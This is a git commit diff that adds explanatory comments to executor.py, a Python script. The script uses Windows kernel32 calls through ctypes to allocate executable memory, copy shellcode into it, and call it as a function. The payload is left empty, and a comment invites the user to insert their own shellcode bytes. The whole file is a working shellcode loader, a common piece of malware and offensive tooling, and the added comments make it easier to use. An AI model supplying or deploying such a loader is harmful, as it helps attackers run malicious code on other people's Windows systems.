ee094468ea487c39f11bb52fce53d26b09dc8d43
v4 <111375797+Vantrix1@users.noreply.github.com>
2026-03-06 21:42:05 +0000

    Enhance comments for clarity in executor.py
    Added comments to clarify memory allocation and execution steps.

--- executor.py
+++ executor.py
@@ -1,9 +1,9 @@
 import ctypes
 
-kernel32 = ctypes.windll.kernel32
+kernel32 = ctypes.windll.kernel32 # references windows system apis so functions can be used
 
 def write_memory(buf):
-    length = len(buf)
+    length = len(buf) # Gets length (useful for allocating memory later)
 
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     kernel32.RtlMoveMemory.argtypes = (
@@ -11,17 +11,17 @@ def write_memory(buf):
     ctypes.c_void_p,
     ctypes.c_size_t)
 
-    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)
-    kernel32.RtlMoveMemory(ptr,buf,length) 
+    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40) # Allocates needed memory and allows it to be executed
+    kernel32.RtlMoveMemory(ptr,buf,length) # Copies shellcode into allocated memory
     return ptr
 
 def execute(shellcode):
-    buffer = ctypes.create_string_buffer(shellcode)
+    buffer = ctypes.create_string_buffer(shellcode) # Creates buffer
     ptr = write_memory(buffer)
 
-    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
+    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None)) # Uses pointer as an executable function
     shell_func()
 
 if __name__ == '__main__':
-    shellcode=(b"")
+    shellcode=(b"") # PUT YOUR SHELLCODE BYTES HERE!!
     execute(shellcode)
